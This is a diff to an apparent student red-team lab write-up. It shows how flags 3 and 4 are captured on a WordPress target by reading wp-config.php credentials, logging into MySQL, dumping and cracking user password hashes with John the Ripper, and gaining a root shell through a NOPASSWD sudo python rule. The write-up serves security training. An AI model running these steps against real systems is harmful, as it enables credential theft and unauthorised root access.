@@ -128,3 +128,39 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         - ```find . -name flag*```
 
 ![](https://github.com/smalani06/cs-final-project/blob/main/images/findflag2.png)
+
+  - `flag3.txt`: _afc01ab56b50591e7dccf93122770cd2_
+    - **Exploit Used**
+      - Look for the mysql username and password in the wp-config.php files.
+        - ```find . -name *wp-config*```
+        - ```nano ./wordpress/wp-config.php```
+      - Log in to the mysql database by using the password found above.
+        - ```mysql -u root -p```
+      - Look at the tables and search for flags in the wp_posts table.
+        - ```USE wordpress;```
+        - ```SHOW TABLES;```
+        - ```select * from wp_posts where post_content like '%flag%';```
+
+![](https://github.com/smalani06/cs-final-project/blob/main/images/wp-config.png)
+![](https://github.com/smalani06/cs-final-project/blob/main/images/login.png)
+![](https://github.com/smalani06/cs-final-project/blob/main/images/tables.png)
+![](https://github.com/smalani06/cs-final-project/blob/main/images/flag3.png)
+
+  - `flag4.txt`: _715dea6c055b9fe3337544932f2941ce_
+    - **Exploit Used**
+      - After logging into the mySQL database, we checked the table wp_users where the user's password hashes were stored.
+        - ```SELECT * FROM wp_users;```
+      - Used john the ripper to crack user steven's password.
+        - ```john wp_hashes.txt```
+      - Connected to the server via SSH using steven's password.
+      - List the allowed (and forbidden) commands for the invoking user steven.
+        - ```sudo -l```
+      - Since NOPASSWD is set for /usr/bin/python/, we can use python to escalate our privilege to root.
+        - ```sudo python -c 'import pty;pty.spawn("/bin/bash")'```
+      - Use find to locate flag4.
+        - ```find . -name flag*```
+        - cat /root/flag4.txt
+
+![](https://github.com/smalani06/cs-final-project/blob/main/images/sshsteven.png)
+![](https://github.com/smalani06/cs-final-project/blob/main/images/findflag4.png)
+![](https://github.com/smalani06/cs-final-project/blob/main/images/flag4.png)
